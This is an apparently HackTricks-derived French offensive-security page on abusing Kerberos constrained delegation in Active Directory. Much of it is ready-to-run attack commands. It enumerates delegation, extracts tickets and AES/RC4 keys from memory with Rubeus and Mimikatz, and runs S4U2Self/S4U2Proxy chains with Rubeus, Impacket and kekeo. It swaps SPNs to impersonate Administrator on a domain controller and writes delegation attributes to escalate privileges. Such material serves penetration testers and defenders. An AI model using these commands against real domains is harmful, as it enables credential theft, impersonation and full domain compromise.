# Delegation contrainte

{{#include ../../banners/hacktricks-training.md}}

## Delegation contrainte

Grâce à cela, un **Domain admin** peut **autoriser** un ordinateur à **usurper l'identité d'un utilisateur ou d'un ordinateur** auprès de n'importe quel **service** d'une machine.

- **Service for User to self (_S4U2self_):** Tout **compte de service possédant un SPN** peut généralement obtenir un TGS vers lui-même au nom d'un utilisateur arbitraire. Si le compte possède également [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) dans _userAccountControl_, ce TGS est **forwardable**, ce qui rend la protocol transition directement utile pour la **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** Un **compte de service** peut obtenir un TGS au nom d'un utilisateur vers les SPN listés dans **msDS-AllowedToDelegateTo**. Le ticket justificatif utilisé dans S4U2Proxy doit être un ticket **forwardable** vers le service délégant : soit un véritable ticket client-service capturé depuis la victime, soit un ticket généré avec **S4U2Self + T2A4D**.

**Note** : Si un utilisateur est marqué comme « _Account is sensitive and cannot be delegated_ » dans AD, ou s'il est membre de **Protected Users**, vous ne pourrez généralement **pas usurper son identité** via la delegation contrainte. Dans les domaines modernes, privilégiez le matériel **AES** plutôt que les hypothèses limitées à RC4 lorsque vous ciblez des comptes avec delegation activée.

Cela signifie que si vous **compromettez le hash du service**, vous pouvez **usurper l'identité d'utilisateurs** et obtenir un **accès** en leur nom à n'importe quel **service** sur les machines indiquées (possible **privesc**).

De plus, vous n'aurez **pas seulement accès au service que l'utilisateur est en mesure d'usurper, mais également à n'importe quel service**, car le SPN (le nom du service demandé) n'est pas vérifié (dans le ticket, cette partie n'est pas chiffrée/signée). Par conséquent, si vous avez accès au **service CIFS**, vous pouvez également accéder au **service HOST** en utilisant, par exemple, le flag `/altservice` dans Rubeus. La même faiblesse de permutation de SPN est exploitée par **Impacket getST -altservice** et d'autres outils.

De plus, l'**accès au service LDAP sur un DC** est nécessaire pour exploiter un **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Note de l’opérateur :** ne faites pas confiance aux captures d’écran d’**ADUC** ou de BloodHound seules pour l’audit de **gMSA/sMSA**. Ces comptes masquent souvent l’onglet **Delegation** habituel ; énumérez donc directement les attributs bruts **`userAccountControl`** et **`msDS-AllowedToDelegateTo`**.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition vs Kerberos-only constrained delegation

Si le compte compromis dispose de **T2A4D**, vous pouvez généralement exécuter toute la chaîne **`S4U2Self -> S4U2Proxy`** uniquement avec la clé de service/TGT.<sup>[[2]](#references)</sup>

S’il dispose uniquement de **`msDS-AllowedToDelegateTo`** (le mode classique **"Use Kerberos only"**), la delegation peut toujours être exploitée, mais le ticket justificatif pour S4U2Proxy doit être un **véritable ticket forwardable user-to-service** pour le service déléguant. En pratique, cela signifie voler ou capturer un TGS de victime depuis **LSASS/ccache** et l’injecter dans la deuxième étape (`/tgs:` dans Rubeus). Un ticket S4U2Self **non-forwardable** ne suffit **pas** pour la constrained delegation classique ; si c’est votre seul ticket justificatif, consultez plutôt [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

### Cross-domain constrained delegation notes (2025+)

Depuis **Windows Server 2012/2012 R2**, le KDC prend en charge la constrained delegation entre domaines/forêts via les extensions S4U2Proxy. Les versions modernes (Windows Server 2016–2025) conservent ce comportement et ajoutent deux SIDs PAC pour signaler le protocol transition :<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) lorsque l’utilisateur s’est authentifié normalement.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) lorsqu’un service a affirmé l’identité via le protocol transition.

Attendez-vous à trouver `SERVICE_ASSERTED_IDENTITY` dans le PAC lorsque le protocol transition est utilisé entre domaines, ce qui confirme que l’étape S4U2Proxy a réussi.<sup>[[1]](#references)</sup>

### Impacket / Linux tooling (altservice & full S4U)

Les versions récentes d’Impacket (0.11.x+) exposent la même chaîne S4U et le même SPN swapping que Rubeus :<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
Si vous préférez forger d’abord le user ST (par exemple, avec uniquement le hash offline), associez **ticketer.py** à **getST.py** pour S4U2Proxy. **tgssub.py** est également utile lorsque vous disposez déjà d’un ccache fonctionnel et que vous devez seulement remplacer la classe de service pour le même hôte. Consultez l’issue Impacket ouverte #1713 pour connaître les problèmes actuels (KRB_AP_ERR_MODIFIED lorsque le ST forgé ne correspond pas à la clé SPN).<sup>[[2]](#references)</sup>

### Automatisation de la configuration de la delegation avec des credentials à faibles privilèges

Si vous disposez déjà de **GenericAll/WriteDACL** sur un computer ou un service account, vous pouvez définir à distance les attributs requis sans utiliser RSAT avec **bloodyAD** (2024+) :
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Cela vous permet de créer un chemin de constrained delegation pour la privesc sans privilèges DA dès que vous pouvez écrire ces attributs.

- Step 1: **Obtenir le TGT du service autorisé**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Il existe **d'autres moyens d'obtenir un ticket TGT** ou le **RC4** ou l'**AES256** sans être SYSTEM sur l'ordinateur, comme le Printer Bug et unconstrained delegation, le NTLM relaying et l'Active Directory Certificate Service abuse
>
> **Il suffit d'avoir ce ticket TGT (ou son hash) pour effectuer cette attaque sans compromettre l'ensemble de l'ordinateur.**

- Étape 2 : **Obtenir un TGS pour le service en usurpant l'utilisateur**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Plus d’informations sur ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) et [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Présentation de la délégation contrainte Kerberos (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Abus de la délégation avec Impacket (partie 2) : délégation contrainte (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Délégation contrainte Kerberos (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity a tué le domaine : une présentation offensive de Kerberos (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
{{#include ../../banners/hacktricks-training.md}}
